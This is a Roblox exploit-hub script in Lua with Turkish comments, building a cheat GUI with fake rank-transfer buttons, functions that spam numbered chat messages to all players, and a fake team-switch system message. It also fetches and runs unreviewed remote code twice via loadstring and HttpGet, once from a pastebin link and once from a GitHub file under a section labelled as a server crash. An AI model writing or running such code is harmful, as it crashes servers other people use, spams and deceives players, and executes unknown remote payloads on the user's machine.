--[[ 
██╗   ██╗ █████╗     ██████╗  ██████╗ ███████╗    
██║   ██║██╔══██╗    ██╔══██╗██╔═══██╗██╔════╝    
██║   ██║███████║    ██║  ██║██║   ██║███████╗    
██║   ██║██╔══██║    ██║  ██║██║   ██║╚════██║    
╚██████╔╝██║  ██║    ██████╔╝╚██████╔╝███████║    
 ╚═════╝ ╚═╝  ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝    

TA ØsØ Hub - Geliştirici: Sydear Hub & ØsØ Ekibi 
--]]

-- KORUMA KATMANLARI
for i = 1, 20 do
	if not game:IsLoaded() then game.Loaded:Wait() end
	task.wait(0.05)
end

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")

-- LOGO GÖSTERİMİ
local logoGui = Instance.new("ScreenGui", PlayerGui)
logoGui.Name = "TA_Logo"
local logo = Instance.new("TextLabel", logoGui)
logo.Size = UDim2.new(0.3, 0, 0.1, 0)
logo.Position = UDim2.new(0.35, 0, 0.45, 0)
logo.BackgroundTransparency = 1
logo.Text = "TA ØsØ Hub Yükleniyor..."
logo.TextScaled = true
logo.TextColor3 = Color3.fromRGB(255, 255, 255)
task.wait(2)
logoGui:Destroy()

-- ANA GUI
local mainGui = Instance.new("ScreenGui", PlayerGui)
mainGui.Name = "TA_GUI"

local anaFrame = Instance.new("Frame", mainGui)
anaFrame.Size = UDim2.new(0.3, 0, 0.5, 0)
anaFrame.Position = UDim2.new(0.35, 0, 0.25, 0)
anaFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
anaFrame.Active = true
anaFrame.Draggable = true
anaFrame.BorderSizePixel = 0

-- PROFİL BİLGİSİ
local profil = Instance.new("TextLabel", anaFrame)
profil.Size = UDim2.new(1, 0, 0.1, 0)
profil.Position = UDim2.new(0, 0, 0, 0)
profil.BackgroundTransparency = 1
profil.Text = "Oyuncu: " .. LocalPlayer.Name
profil.TextColor3 = Color3.fromRGB(255, 255, 255)
profil.TextScaled = true

-- KATEGORİLER
local kategoriler = {
	"Anasayfa", "Sahte Rütbe Transfer", "Araç Sürme",
	"Tanıtım", "Temalar", "Ayarlar", "Toollar"
}

for i, kategori in ipairs(kategoriler) do
	local buton = Instance.new("TextButton", anaFrame)
	buton.Size = UDim2.new(0.9, 0, 0.08, 0)
	buton.Position = UDim2.new(0.05, 0, 0.12 + (i - 1) * 0.09, 0)
	buton.Text = kategori
	buton.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
	buton.TextColor3 = Color3.fromRGB(255, 255, 255)
	buton.TextScaled = true
end

-- TOOL KOMUTLARI (JJ / GJ / HJ)
local toolKomutlar = {
	JJ = function(sayi)
		for i = 1, sayi do
			game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(tostring(i):upper(), "All")
			task.wait()
		end
	end,
	GJ = function(sayi)
		for i = 1, sayi do
			local yazi = tostring(i):sub(1,1):upper() .. tostring(i):sub(2) .. "."
			game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(yazi, "All")
			task.wait()
		end
	end,
	HJ = function(sayi)
		for i = 1, sayi do
			local yazi = tostring(i):gsub(".", "%1 "):upper() .. tostring(i)
			game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(yazi, "All")
			task.wait()
		end
	end
}

-- YAZILARI GÖRME
pcall(function()
	loadstring(game:HttpGet("https://pastebin.com/raw/Mf093x4q"))()
end)

-- FAKE TAKIM GEÇİŞ
local fakeTakim = Instance.new("TextButton", anaFrame)
fakeTakim.Size = UDim2.new(0.9, 0, 0.08, 0)
fakeTakim.Position = UDim2.new(0.05, 0, 0.8, 0)
fakeTakim.Text = "Ordu Subayları Takımına Geç (Sahte)"
fakeTakim.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
fakeTakim.TextColor3 = Color3.fromRGB(255, 255, 255)
fakeTakim.TextScaled = true

fakeTakim.MouseButton1Click:Connect(function()
	game.StarterGui:SetCore("ChatMakeSystemMessage", {
		Text = "[TA ØsØ Hub] Ordu Subayları Takımına sahte geçiş yapıldı!";
		Color = Color3.fromRGB(0,255,255);
	})
end)

-- SERVER CRASH (TEST AMAÇLI) - KORUMALI KULLANIM
pcall(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/v0c0n1337/scripts/refs/heads/main/Protected_9068977494054906.lua.txt"))()
end)

-- NOT: Gelişmiş sistemler ve Toollar, GUI içinden ayrı olarak çağrılabilir şekilde hazırlanabilir.